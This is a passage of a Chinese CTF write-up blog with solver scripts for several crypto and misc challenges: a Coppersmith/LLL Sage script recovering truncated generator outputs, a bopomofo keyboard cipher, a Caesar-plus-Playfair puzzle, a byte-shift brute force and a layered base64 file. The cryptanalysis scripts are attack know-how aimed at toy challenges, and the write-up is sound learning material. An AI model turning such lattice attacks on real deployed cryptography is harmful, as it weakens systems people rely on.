<p>设 x[0] x[1] 的低73位为 k0 和 k1，写出来的等式是<br>$$<br>f(x_{0}&lt;&lt;73+k_0)=x_{1}&lt;&lt;73+k_1<br>$$<br>完成脚本的篡改，这个 coppersmith.sage 来自<a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a>，也是从la佬博客里看到的；la佬yyds</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(<span class="string">&quot;coppersmith.sage&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">pi = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line">x_ = [<span class="number">3248642833056635029095920782095626337949113592116495266</span>, <span class="number">4883935221919623989344404485025479346028101682781790392</span>]</span><br><span class="line">c = <span class="number">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line"></span><br><span class="line">PR.&lt;t&gt; = PolynomialRing(Fp)</span><br><span class="line">f = t * t + pi</span><br><span class="line"></span><br><span class="line">PR.&lt;k0, k1&gt; = PolynomialRing(Fp)</span><br><span class="line">s = f(x_[<span class="number">0</span>]*<span class="number">2</span>^<span class="number">73</span> + k0)-x_[<span class="number">1</span>]*<span class="number">2</span>^<span class="number">73</span>-k1</span><br><span class="line">roots = coron(f, X=<span class="number">2</span>^<span class="number">85</span>, Y=<span class="number">2</span>^<span class="number">85</span>, k=<span class="number">1</span>, debug=<span class="literal">True</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>emmmmm conron没有定义，看了下 github 里的源码， 确实没有找到这个函数；然后对这个构造多项式是否可解也不是很确定，就做不下去了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711144022632.png" alt="image-20210711144022632"></p>
<p>这份 github 里的有一个这个函数，但是感觉是用在 RSA 类型的题目上的</p>
<p>早上起来，抱着试一试的心态，又重新研究起这道题目；就是无止境的搜索吧，信息搜集的能力还是要向尚师傅学习</p>
<p>然后找到了原题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/56JSZRFN%7BE%60PAZORN_E%7D_PM.gif" alt="img"></p>
<p>是三个月前 zer0pts CTF 的题目，看来这就是多刷题的意义。当时顺腾摸瓜，找到了 Joseph 师傅的博客，这位师傅是神人啊，之前好多东西都从他这里找到，TQQQQQL</p>
<p>然后当时就是改了他的脚本做出来的，除了一些推导（开始觉得哦原来如此，但后面发现就是把我的给展开了），当然最主要的，他提供了一个 coppersmith 求小根函数的 github 链接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">		d = f.degree()</span><br><span class="line"></span><br><span class="line">	R = f.base_ring()</span><br><span class="line">	N = R.cardinality()</span><br><span class="line"></span><br><span class="line">	f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">	f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">	G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">		base = N^(m-i) * f^i</span><br><span class="line">		<span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">			g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">			G.append(g)</span><br><span class="line"></span><br><span class="line">	B, monomials = G.coefficient_matrix()</span><br><span class="line">	monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">	factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">	<span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">		B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">	B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">	B = B.change_ring(QQ)</span><br><span class="line">	<span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">		B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line"></span><br><span class="line">	H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B*monomials):</span><br><span class="line">		H.append(h)</span><br><span class="line">		I = H.ideal()</span><br><span class="line">		<span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">			H.pop()</span><br><span class="line">		<span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">			roots = []</span><br><span class="line">			<span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">				root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">				roots.append(root)</span><br><span class="line">			<span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

<p>稍微改一下脚本就出来了，很快啊</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(<span class="string">&#x27;coppersmith.sage&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">b = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line">c = <span class="number">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line">w0 = <span class="number">3248642833056635029095920782095626337949113592116495266</span></span><br><span class="line">w1 = <span class="number">4883935221919623989344404485025479346028101682781790392</span></span><br><span class="line"></span><br><span class="line">b,w0,w1 = <span class="built_in">map</span>(Fp, [b,w0,w1])</span><br><span class="line">PR.&lt;k0, k1&gt; = PolynomialRing(Fp)</span><br><span class="line"></span><br><span class="line">f = <span class="number">2</span>^<span class="number">146</span> * w0^<span class="number">2</span> + <span class="number">2</span>^<span class="number">74</span> * w0 * k0 + k0^<span class="number">2</span> - <span class="number">2</span>^<span class="number">73</span> * w1 + b - k1</span><br><span class="line">roots = small_roots(f, (<span class="number">2</span>^<span class="number">73</span>, <span class="number">2</span>^<span class="number">73</span>), m=<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">k0, k1 = roots</span><br><span class="line"></span><br><span class="line">v0 = <span class="number">2</span>^<span class="number">73</span> * w0 + k0</span><br><span class="line">v1 = <span class="number">2</span>^<span class="number">73</span> * w1 + k1</span><br><span class="line"></span><br><span class="line">PR.&lt;v&gt; = PolynomialRing(Fp)</span><br><span class="line">f = v^<span class="number">2</span> + b</span><br><span class="line">y = f(v1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    y = f(y)</span><br><span class="line">    c ^^= <span class="built_in">int</span>(y)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>

<p>当我整理WP的时候，将这个函数用到我昨天的等式上，发现也出来了，再贴一下完整脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(<span class="string">&quot;coppersmith.sage&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">pi = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line">x_ = [<span class="number">3248642833056635029095920782095626337949113592116495266</span>, <span class="number">4883935221919623989344404485025479346028101682781790392</span>]</span><br><span class="line">c = <span class="number">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line"></span><br><span class="line">PR.&lt;t&gt; = PolynomialRing(Fp)</span><br><span class="line">f = t * t + pi</span><br><span class="line"></span><br><span class="line">PR.&lt;k0, k1&gt; = PolynomialRing(Fp)</span><br><span class="line">s = f(x_[<span class="number">0</span>]*<span class="number">2</span>^<span class="number">73</span> + k0)-x_[<span class="number">1</span>]*<span class="number">2</span>^<span class="number">73</span>-k1</span><br><span class="line">roots = small_roots(s, (<span class="number">2</span>^<span class="number">73</span>, <span class="number">2</span>^<span class="number">73</span>), m=<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">k0, k1 = roots</span><br><span class="line"></span><br><span class="line">v0 = <span class="number">2</span>^<span class="number">73</span> * x_[<span class="number">0</span>] + k0</span><br><span class="line">v1 = <span class="number">2</span>^<span class="number">73</span> * x_[<span class="number">1</span>] + k1</span><br><span class="line"></span><br><span class="line">y = f(v1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    y = f(y)</span><br><span class="line">    c ^^= <span class="built_in">int</span>(y)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>

<p>所以jo师傅博客上面的推导，其实我们已经做了大半，就差一个函数实现了</p>
<p><em>学到还挺多的。通过这道题，我认识到，以后在Crypto方向上，必须即时跟进新的题型，以及多逛逛github，并且足够幸运能够看懂一些原理，尽量都自己实现一下。现在确实tcl，之前实现的一个playfair，今天想跑的时候结果又错误满天飞</em></p>
<h2 id="海那边漂来的漂流瓶"><a href="#海那边漂来的漂流瓶" class="headerlink" title="海那边漂来的漂流瓶"></a>海那边漂来的漂流瓶</h2><p>春哥师傅的题目，当时我们组有师傅第二个做出来</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<p>在海的那边漂过来一个漂流瓶，停在了沙滩上。 你把它捡起来，却不知道漂流瓶里的纸上到底写了些啥。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZJ6 -3 AI6 G8 EL NJ4 EJ/ XJ4 1O3 FU3 RU RUP EJ/ XJ4 S06 54 284 Q/6 J0 ， 5J3 VU04 T;6 2J4 431 EJ/ XU3 。 Y4 1O3 D9 G3 S06 VU/6 ， U VM4 RU/ EJI4 RU XJ/6 G4 、 VUP 1O3 G4 、 W96 1O3 G4 、 WL6 M06 G4 、 VUP 5J6 VU04 、 VUP 5J6 G4 、 AUL6 XU4 VU04 、 W96 5J/ G4 、 5; CJ84 VU04 、 S06 W.6 VU04 、 MP6 XUP6 VU04 、 RU8 U4 VU04 、 RU8 U4 G4 、 W96 S06 G4 、 EL VM/6 G4 、 QU/6 2J/ VU04 。 ZJ6 X94 EK6 2U6 SO4 BJ/6 G4 T QJ6 WL6 1J4 WJ3 QJ6 WL6 QU6 1J4 T QJ6 WL6 2L3 WJ3 QJ6 WL6 QU6 2U6 C04 M3 QUP UP G.3 Y4 AJ3 QUP RU, 。 FU6 5J/ U.6 M6 XJ4 2J04 RU04 GK4 G6 2U6 M/4 2U4 FM3 2K6 JP4 WU6 ， Y94 W96 5J/ G4 M3 5; CJ84 VU04 5 RU0 M06 1P3 U/ E9 G4 S06 1O3 Y.3 VU;4 2U6 ZJ6 -3 AI6 G8 EL NJ4 EJ/ XJ4 CP3 XU4 J94 2U4 G4 T/6 VU04 2J/ VU VU;4 2U6 Y.3 VU;4 ， Y4 S06 1J4 1O3 G;4 VU0 RU/ 5; CJ84 VU04 ZP M06 VU; ， DJ84 J VU 54 W96 5J/ G4 J4 Z/ FM 、 J B4 FM 5 C.4 ， Y94 VU;4 VU VU/6 54 5; CJ84 VU04 1O3 1J4 2U6 5; CJ84 G4 ， U06 J VU （ NJ6 T/ 284 2J4 VU ） VU VU/6 54 5; CJ84 VU04 CK6 AO3 5P4 ， 5J03 EK4 RU, RUP4 56 RUL3 2U6 284 J0 ， DJ84 M,4 284 2J4 VU RUP4 BJ4 W96 5J/ G4 C93 VU04 2U4 FM 。 1U,6 J;4 RU4 183 ZJ6 X94 EK6 M/4 VU WU 94 ZJ3 VU.4 2U6 EK6 G4 1L EJI3 FU3 X96 I6 。 VU; 2JO4 M6 5J/ G0 EL 2; TJ EJO CJ86 G4 U3 TJ04 XU06 W96 J0 VU 04 5J3 UL4 284 T/6 G4 JO6 AJ4 2U6 ， DL3 XU;6 2L4 QU/6 C/6 2U4 FM Z8 503 、 WJ3 2U4 FM3 2K6 2U6 T/6 1P3 M3 1U4 AU03 2J G4 ZJ4 RUP4 2J03 WJ6 WJ/ FUP6 TK XU.6 YL4 T/6 YJ3 N9 ， ZJ6 -3 AI6 G8 EL NJ4 EJ/ XJ4 2U6 VM03 VU04 RU, DK4 U4 1U4 D9 1J4 ZP BP6 D.3 T.6 AU4 2U6 2J CJO4 FM 1U/4 RU/ EJI4 VM3 2JI M06 1P3 2U 2J4 D9 Z8 2U6 VU; HJP 2U4 294 。</span><br></pre></td></tr></table></figure>

<p>hint1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">广州火车站上霸气外露的标语：统一祖国 振兴中华</span><br></pre></td></tr></table></figure>

<p>hint2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靠北耶！E04！</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 解题思路</p>
</blockquote>
<p>显然是类似一种单表替换的东西，然后随便挑了几个去搜，就在 github 上找到<a href="https://github.com/chinese-opendesktop/cin-tables/blob/master/bopomofo.cin">https://github.com/chinese-opendesktop/cin-tables/blob/master/bopomofo.cin</a> 至于第一个 hint 我到现在都没有理解其意思，第二个 hint 是台湾方言和台湾网络用语，夸你很牛逼的意思</p>
<p>github 里是正体注音輸入法的对照词库吧，正好对应了 E04! 的由来，也很呼应题目</p>
<p>然后手撕吧，太菜了，不会用 python 处理数据</p>
<p>撕到一半</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">福尔摩沙高速公路北起基金公路南至大鹏湾，主线长<span class="number">431</span>公里，自北开始南行，依序经过基隆市、台北县、桃园县、新竹县、苗栗县、台中县、彰化县、南投县、云林县、嘉义县、台南县、高雄县与屏东县。fu lai ge的内容是吃葡萄不吐葡萄皮不吃葡萄不吐葡萄皮的汉语拼音首字母拼接。</span><br></pre></td></tr></table></figure>

<p>另一位师傅说后面还有一些信息，但有师傅说直接输入这句顺口溜的拼音首字母就过了</p>
<p>过了就过了吧</p>
<p>然后看官方 WP 春哥师傅说可以用在线的网站搞；切换下输入法就好，强啊</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711151337886.png" alt="image-20210711151337886"></p>
<p><em>另外这种题目，比赛的时候不要死扣，能做出来就好，为了完美主义全部整出来绝对是浪费时间。在比赛中这点很重要。你有功夫大可赛后再搞，比如我现在就懒得搞了doge</em></p>
<hr>
<h2 id="群主说要出简单的题目大家把这题想简单一点"><a href="#群主说要出简单的题目大家把这题想简单一点" class="headerlink" title="群主说要出简单的题目大家把这题想简单一点"></a>群主说要出简单的题目大家把这题想简单一点</h2><p>xsl</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">24873777989291448485268365702265085243886872900039809831478881276969311714448924581398692832639705916538111455861057354225427758736198452679468399039512440497290615485190994957684665065261280544484301856860844163436499302230085760545686486398949018187416289923500558688885485672960734334858119391323987554701544773420070317895909846297195832399677291338220818181502181317849952785959097285626009703863257450199781708945715701136683994546852422993684382468187651935055302074609980311161155531603473091857526099148935429447319415714778860215376802270686310782735079899235228731429165106477537031235405221734008734614847</span></span><br><span class="line">e = <span class="number">12436888994645724242634182851132542621943436450019904915739440638484655857224462290699346416319852958269055727930528677112713879368099226339734199519756220248645307742595497478842332532630640272242150928430422081718249651115042880272843243199474509093708144961750279344442742836480367167429059695661993777350613653317802356713323129593521588320771616955563426747034967432053960828426250168954828986666929922730060781213890566121107119389060806644531516491192343284701151238691996162679338542186167193568672632227858449997036747029810933106336313085633759799229646747282205612102678724267585967720538082620536177904609</span></span><br><span class="line">c = <span class="number">7539424334663709603622451394173266049480031393220309445902319310504736287365860451132752036622339554159799611768328686792828750952551268647863160547774237934958072391797341405165512721597085695555356929495861914056799039140107261439671707574841789330531198534325422015873621769489969596614802282764401661006564546159674397356683650318142728009273827997179696988926599672213482848150751054351595386402597000601684644207559735499031666361222038615475154046453649719203304187309556004660926226182353445661702352380654352874617084419834338343925880593023307238768452509962</span></span><br></pre></td></tr></table></figure>

<p>e 很大，尝试过 boneh_durfee，但是出不来；检查条件，这 e 也太大了吧</p>
<p>然后在诸多hint中看到</p>
<p>当你凝视密文的时候，密文也在凝视着你。</p>
<p>妙啊，尼采</p>
<p>当你凝视密文的时候，明文也在凝视着你。直接 c 转字节，当时手快拿下一血</p>
<h2 id="The-Dedication-of-Suspect-M"><a href="#The-Dedication-of-Suspect-M" class="headerlink" title="The Dedication of Suspect M"></a>The Dedication of Suspect M</h2><p>麻了，这场比赛最麻的一道题。8神师傅的题目，春哥师傅隔了7分钟就出了并且全场唯一解，直到比赛结束，我都丝毫没有头绪</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<p>题目信息很多，我直接给图了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711152717959.png" alt="image-20210711152717959"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>我整理出来的，有以下线索：</p>
<ul>
<li><p>是一个动态的环境，提供压缩包下载，里面有个名为 M 的二进制文件，文件内容每重开一次环境都不相同、大小从 2K 到 5K 不等；那么flag 基本上也是动态的了</p>
</li>
<li><p>flag 的内容是小写字母的十六进制，中间有短横分隔</p>
</li>
<li><p>嫌疑人X的献身改成了嫌疑人M的陷深</p>
</li>
</ul>
<p>？？？有内味了？？？燃起来了？？？</p>
<p>一开始的时候丝毫没有头绪，比如这是其中一次下载的文件内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">222222222qq222222222qqq22222222222qq22222222222222222222222222222222222q2222q222222qq222222222qq2qq2222222222222222222222222qq22222222qqqq2222222qqq222222222222222qqqqqq22222222222222222qq2222222qq222222222222222222qq2qq2222222qq2qq2222222qqqqqq222222222222222222222222qq2222222qqqqqqqq2222qq22222222qqq222222222222qqqqqqqq2222qq2222222qqqqqqqq2222qq22222222qq22222222qq22222222222222222q222222qq2qq2222222qq22222222222qqq22222q222222qq222222222222An2nqq2222A9qqqn222222222An2n22222222222222222222222222222222A92n2A92n2222An2n2222222An2nn2n2222222222222222222222A9q2rn22222A9qqqn2222A9qqqrn222222222222An22qqqn22222222222222A9q2rn2222An2n2222222222222222An2nn2n22222An2nn2n22222An22qqqn222222222222222222222A9q2rn2222Anqqqqq22n2A9q2rn2222A9qqqn2222222222Anqqqqq22n2A9q2rn2222Anqqqqq22n2A9qqrn2222A9qqrn2222A9q2rn2222222222222A92n2222An2nn2n22222An2n22222222A9qqqn22A92n2222An2rn2222qqq222n2n2&gt;qn22An2nqqA222qqqq22n2n2nqqq222222qqq2222qq22qq22qq2222n2&gt;A9Anq&gt;2n222n2n2nqqqq22n2n2nn2n2222222qq222222qq222An2n^n2n222An2nqqA222Anqn2An2n22222222222n2n2nqqA222222qq22222An2n^n2n222n2n2nqqqq22222222222n2n2nn2n2222n2n2nn2n2222n2n2nqqA22222qqq222222222222An2n^n2n222nAqqqAA9A9An2n^n2n22An2nqqA2222222222nAqqqAA9A9An2n^n2n222nAqqqAA9A9An2nAn2n22An2nAn2n22An2n^n2n222222qq222Anq&gt;2n222n2n2nn2n2222n2n2nqqqq22An2nqqA2Anq&gt;2n222nrn22n22A9qqqn22n2n2nA22n2n2&gt;qqn2A9&gt;qqn22n2n22q2rn222A2qqrn2An2nAn2nAn2n22N92n22nAqAn2n222n2n29qqrn22n2n2nn2nq222A9qqrn22A9qqrn2n2nqqq&gt;2n22n2n22qrrn2nAqAAA2Aqq22qqqqqqq22n2nqqqrrn22A9qqrn222n2nqqq&gt;2n222n2n29qqrn22qqqqqqq22n2n2nn2nq222n2n2nn2nq222n2nqqqrrn22A9qqqn22qqqqqqq2n2nqqq&gt;2n222222A92A92nAqP2q2Nq2n2n2&gt;qqn2qqqqqqq22222A92A92n2nqqq&gt;2n222222A92A92n2n2n2n2n2n2n2n2n2n2n2nqqq&gt;2n222A9qqrn2nAqAn2n222n2n2nn2nq222n2n29qqrn2n2n2&gt;qqnnAqAn2n222n2n2rPAn2nqqA222n2n2nq22n2n2nqAAnqq&gt;2rn22n2n2n2n2n2An2n^n2nn2n2nqA2nqA2nN2n2rn2222n2n2n222n2n2n^n2n22n2nqq2&gt;qqnAn22qqA2An22qqA22nAqq&gt;An2n22n2n2n^n2n222AA2Aqn2nAnqqqqqqn22nAn2n^n2nAn2n^n@nq22nAqq&gt;An2n222n2n2n^n2nAnqqqqqqn22n2nqq2&gt;qqn22n2nqq2&gt;qqn22nAn2n^n2nAn2nqqA2Anqqqqqqn2nAqq&gt;An2n222A92A922222An2n^n2n2n2n2nqAAnqqqqqqn22A92A92222nAqq&gt;An2n222A92A92222n2n2nqn2n2n2n2nqn2n2nAqq&gt;An2n2An22qqA2222n2n2n222n2nqq2&gt;qqn22n2n2n^n2n2n2n2nqA222n2n2n22AA92n2n2nqqqqn222n2nqqn22n2nqn2nAnqqqqA222n2nqn2nqnn2nqqqqA2n2nqqq</span><br><span class="line">qqqA92nrnqqn2222n2nqn222n2nq&gt;qqA222nAqAnqnqAn2nqqqqnn2nqqqqn222222n2nqn22n2nqqqqA22AnqqqqqqAnAqqqqqqA222n2nqqqqAn2nqqA@nqn222222n2nqn222n2nq&gt;qqAnAqqqqqqA222nAqAnqnqA222nAqAnqnqA222n2nqqqqAn2nqqqqnnAqqqqqqA222222n2nqn2AnqA2222222n2nqqqqA22n2nqn2nAqqqqqqA2AnqA22222222222n2nqn2AnqA2222222n2nqqqqA22n2nqqqqA222222n2nqnn2nqqqqn2222n2nqn222nAqAnqnqA222n2nq&gt;qqA22n2nqn22222n2nqnAnqqA922nAqqqqA2222nAqqA222nAqA22nAqqqA22222nAqAnAqA2nAqqqA222nAqqAAqqA2222nAqqA22222nAqA2222nAqqqA2222222nAqA222nAqqqqA2nAqqqqA2222222nAqA222nAqqqA222nAqqqqqA22222222222222nAqqqA22nAqqAnAqA2222222nAqA2222nAqqqA2222222222222222nAqA22222222nAqA222222nAqqqA22nAqqqqA2222222222222222nAqA2nAA222222222nAqqqA2222nAqA22222222222nAA2222222222222nAqA2nAA222222222nAqqqA2222nAqqqA22222222nAqA2nAqqqqA22222nAqA222222nAqA222222nAqqqA2222nAqA222222nAqAnAqA222<span class="number">22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222</span><span class="number">22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222</span></span><br></pre></td></tr></table></figure>

<p>根据现有的线索：动态的每次 flag 都不相同、0-9 a-f，我所能想到的就是</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711154007056.png" alt="image-20210711154007056"></p>
<p>但我和组内的师傅试过，不管是给文件 md5，还是给压缩包 md5，都不太行；md4也不行；还有是这个分割线不知道怎么切割，我一并按照样例来处理的，也不知道对不对。TNL，要达不溜屁</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/VRD%7D_TUZ28Z%7BHXI95%7DR4SR4.jpg" alt="img"></p>
<p>第三天起床补的，发现春哥师傅发博客了，这就去添</p>
<p>春哥师傅的思路是将那些不可见的字符给转变成换行符<code>0D 0A</code>，也就是<code>\r \n</code>，<strong>windows用<code>\r\n</code>表示换行</strong></p>
<p>就是将这些不可见的小点通过在128个ascii字符表中位移带走</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210712094503819.png" alt="image-20210712094503819"></p>
<p>春哥师傅准确计算出了密钥，我第一次也可以，但怎么改那些小字母数字提交的flag都不对，之后我重新开了几次环境，就直接爆破了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../M&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    t = <span class="built_in">bytes</span>([(x - i) % <span class="number">128</span> <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">    <span class="built_in">print</span>(t.decode())</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;===================================&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>找到像样的，是figlet艺术字，手敲一遍</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210712093228438.png" alt="image-20210712093228438"></p>
<p>比赛结束，顺手带走几道水题，卡住了的记录一下</p>
<h1 id="36D杯"><a href="#36D杯" class="headerlink" title="36D杯"></a>36D杯</h1><h2 id="justShow"><a href="#justShow" class="headerlink" title="justShow"></a>justShow</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hlcgoyfsjqknyifnpd:bcdefghijklmnopqrstuvwxyza</span><br></pre></td></tr></table></figure>

<p>冒号后面的提示凯撒位移，移回来得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gkbfnxeripjmxhemoc:abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>

<p>然后没想到是playfair，后面是key；拿去在线网站解密一下</p>
<p>这里有点狗，因为playfair的字母表只有25个，一般是用i代替j；但这里不是，还没有明说，所以缺省情况是出不来的。因为key就是a-z，所以字母表就是a-z，不用代替任何字母了，随便改一下参数</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711101933363.png" alt="image-20210711101933363"></p>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flagctfshow&#123;ctfshowicome&#125;</span><br></pre></td></tr></table></figure>

<h2 id="飞鸽传书"><a href="#飞鸽传书" class="headerlink" title="飞鸽传书"></a>飞鸽传书</h2><p>提供附件下载，pub.key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TVdJd09HRm1NamMyWkdKak56VTVNekkzTVdZMFpXVTJNVFl5T0Rrek1qUWxNRUZsTW1GbE0yRXlNelV3TnpRell6VXhObU5rWVRReE1qUTVPV0poTTJKbE9TVXdRV0prWlRVeVkySXpNV1JsTXpObE5EWXlORFZsTURWbVltUmlaRFptWWpJMEpUQkJaVEl6WlRBd1ltVXpPV1F6Tm1Zek5EWXlaVFUzTm1FMk4yRTNaamt4T1RrbE1FRXhPR00zT1RJNE5XSTFNVFJqTmpObVl6a3dNelZsTTJZNU1qQmhaVFEzTnlVd1FXUmhORFJrWkRFNU1tUmxabVF4WW1VM09XWTJNMk16TlRCa01qa3lNR05tSlRCQk5ESTFNV00wWXpZME9XTTNaREptT0RZek1qZGxabVJsTWpNNU9USm1ZVGNsTUVGaFlXVTNZakprTkRneU16Z3lZV0ZoWkRjMVptUmxOalJrWmpobVpqZzJaaVV3UVRJNU5tWTNabVpqTW1VME5UUTFaR00zTnpreU1EVXdZMlZpTkdFNE56RXhKVEJCTmpFd04yRmpNV0UxTldZeFpUQm1aV05pTjJSa1lqWXdabUl6WW1ZeE1Ea2xNRUZoWldNeU16TXpNekl4WkRjek1EQXdNVFl4TmpneVpETmpOR1ZpWXpBd09TVXdRVFV3TURWaU0ySm1NREF3TlRCaVpqUm1OMlUwTTJGak16TmhNRFExTkdJNEpUQkI=</span><br></pre></td></tr></table></figure>

<p>不是很正规的PEM格式的公钥文件，尝试手撕，两次Base64，一次URL，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1b08af276dbc7593271f4ee616289324</span><br><span class="line">e2ae3a2350743c516cda412499ba3be9</span><br><span class="line">bde52cb31de33e46245e05fbdbd6fb24</span><br><span class="line">e23e00be39d36f3462e576a67a7f9199</span><br><span class="line">18c79285b514c63fc9035e3f920ae477</span><br><span class="line">da44dd192defd1be79f63c350d2920cf</span><br><span class="line">4251c4c649c7d2f86327efde23992fa7</span><br><span class="line">aae7b2d482382aaad75fde64df8ff86f</span><br><span class="line">296f7ffc2e4545dc7792050ceb4a8711</span><br><span class="line">6107ac1a55f1e0fecb7ddb60fb3bf109</span><br><span class="line">aec2333321d73000161682d3c4ebc009</span><br><span class="line">5005b3bf00050bf4f7e43ac33a0454b8</span><br></pre></td></tr></table></figure>

<p>看着有点像MTP，跑一下美团用过的脚本，出来这样一个玩意，没有任何实际意思可言，麻了</p>
